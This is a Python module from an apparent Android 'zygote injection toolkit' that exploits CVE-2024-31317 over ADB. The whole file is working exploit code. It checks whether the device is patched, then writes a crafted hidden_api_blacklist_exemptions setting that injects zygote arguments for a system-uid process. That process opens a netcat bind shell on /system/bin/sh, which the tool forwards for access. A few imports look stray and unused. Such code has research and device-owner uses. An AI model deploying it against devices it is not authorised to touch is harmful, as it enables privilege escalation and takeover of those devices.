import socket
import time
import shlex
import datetime
from idlelib.debugger_r import gui_adap_oid
from threading import get_ident

from encodings.punycode import selective_find
from typing import Optional, Union
from enum import Enum

from zygote_injection_toolkit.device import Device
from zygote_injection_toolkit.exceptions import *

from ppadb.client import Client as AdbClient


class Stage1Exploit:
    def __init__(
        self,
        device_serial: Optional[str] = None,
        auto_connect: bool = True,
        adb_client: Optional[AdbClient] = None,
        port: int = 1234,
        silent: bool = False,
        target_uid: Optional[int] = None,
        target_package: Optional[str] = None,
    ) -> None:
        self.silent = silent
        self.target_uid = target_uid
        self.target_package = target_package
        self._port = port
        self.device = Device(device_serial, auto_connect, adb_client)

    def exploit_type(self) -> str:
        android_version = int(self.device.getprop("ro.build.version.release"))

        security_patch = self.device.getprop("ro.build.version.security_patch")
        EXPLOIT_PATCH_DATE = datetime.date(2024, 6, 1)
        # ancient versions don't have the security patch property, but they're not even close to being patched
        if security_patch:
            security_patch_date = datetime.datetime.strptime(
                security_patch, "%Y-%m-%d"
            ).date()
            if security_patch_date >= EXPLOIT_PATCH_DATE:
                raise ZygoteInjectionNotVulnerableException(
                    f'Your latest security patch is at {security_patch_date.strftime("%Y-%m-%d")}, '
                    f'but the exploit was patched on {EXPLOIT_PATCH_DATE.strftime("%Y-%m-%d")} :( '
                    "Sorry!"
                )

        if android_version >= 12:
            return "new"
        else:
            return "old"

    def find_netcat_command(self) -> list:
        "Tries to find the netcat binary"
        NETCAT_COMMANDS = [["toybox", "nc"], ["busybox", "nc"], ["nc"]]
        for command in NETCAT_COMMANDS:
            result = self.device.shell_execute(command + ["--help"], True)
            if result["exit_code"] == 0:
                return command
        else:
            raise ZygoteInjectionException("netcat binary was not found")

    def generate_stage1_exploit(self, command: str, exploit_type: str) -> str:
        "generates the hidden_api_blacklist_exemptions value to trigger the exploit"
        assert exploit_type in ("old", "new")
        # commas don't work because they're treated as a separator
        assert "," not in command

        # old = [
        #     "--setuid=1000",
        #     "--setgid=1000",
        #     "--setgroups=0",
        #     "--seinfo=platform:privapp:system_app:targetSdkVersion=29:complete",
        #     #"--seinfo=platform:isSystemServer:privapp:targetSdkVersion=29:complete",
        #     "--runtime-args",
        #     "--mount-external-android-writable",
        #     "--app-data-dir=/",
        #     "--runtime-flags=43267",
        #     "--nice-name=runmenetcat",
        #     "--invoke-with",
        #     f"{command}#",
        # ]
        
        uid = self.target_uid if self.target_uid is not None else 1000
        gid = self.target_uid if self.target_uid is not None else 1000
        group = self.target_uid if self.target_uid is not None else 3003
        app_data_dir = "/data/user/0/" + self.target_package if self.target_package is not None else "/"
        
        raw_zygote_arguments = [
            f"--setuid={uid}",
            f"--setgid={gid}",
            f"--setgroups={group}",
            "--seinfo=platform:privapp:system_app:targetSdkVersion=29:complete",
            #"--seinfo=platform:isSystemServer:privapp:targetSdkVersion=29:complete",
            "--runtime-args",
            "--mount-external-android-writable",
            f"--app-data-dir={app_data_dir}",
            "--runtime-flags=43267",
            "--nice-name=runmenetcat",
            "--invoke-with",
            f"{command}#",
        ]
        
        zygote_arguments = "\n".join(
            [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments
        )
        if exploit_type == "old":
            # https://infosecwriteups.com/exploiting-android-zygote-injection-cve-2024-31317-d83f69265088
            return f"LClass1;->method1(\n{zygote_arguments}"
        elif exploit_type == "new":
            # https://github.com/oddbyte/CVE-2024-31317/blob/main/31317/app/src/main/java/com/fh/exp31317/MainActivity.java
            payload = "\n" * 3000 + "A" * 5157
            payload += zygote_arguments
            payload += "," + ",\n" * 1400
            return payload

    def is_port_open(self, port: int) -> bool:
        "uses netstat to check if the port is open"
        result = self.device.shell_execute("netstat -tpln")
        for line in result["stdout"].split("\n"):
            split_line = line.split()
            try:
                local_address = split_line[3]
            except IndexError:
                pass
            else:
                if local_address.endswith(f":{port:d}"):
                    return True
        return False

    def exploit_stage1(self) -> bool:
        if self.is_port_open(self._port):
            print(F"Warning: The exploit is already running on port {self._port}!")
            self.device.adb.forward("tcp:" + str(self._port), "tcp:" + str(self._port))
            return True

        # make sure the hidden_api_blacklist_exemptions variable is reset
        self.device.shell_execute(
            ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
        )

        exploit_type = self.exploit_type()
        if not self.silent and exploit_type == "new":
            print("Using new (Android 12+) exploit type")
        elif not self.silent and exploit_type == "old":
            print("Using old (pre-Android 12) exploit type")

        netcat_command = self.find_netcat_command()
        parsed_netcat_command = shlex.join(netcat_command)
        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -E -p " + str(self._port) + " -L /system/bin/sh)&"
        exploit_value = self.generate_stage1_exploit(command, exploit_type)
        exploit_command = [
            "settings",
            "put",
            "global",
            "hidden_api_blacklist_exemptions",
            exploit_value,
        ]

        # run the exploit!
        self.device.shell_execute(["am", "force-stop", "com.android.settings"])
        self.device.shell_execute(exploit_command)
        time.sleep(0.25)
        self.device.shell_execute(["am", "start", "-a", "android.settings.SETTINGS"])
        if not self.silent:
            print("Zygote injection complete, waiting for code to execute...")

        for current_try in range(20):
            time.sleep(1)
            self.device.shell_execute(
                ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
            )

            if self.is_port_open(self._port):
                self.device.adb.forward("tcp:" + str(self._port), "tcp:" + str(self._port))
                if not self.silent:
                    print("Stage 1 success! Active on port " + str(self._port))
                return True

        if not self.silent:
            print("Stage 1 failed, reboot and try again")
        # exploit failed, clean up
        self.device.shell_execute(
            ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
        )
        return False
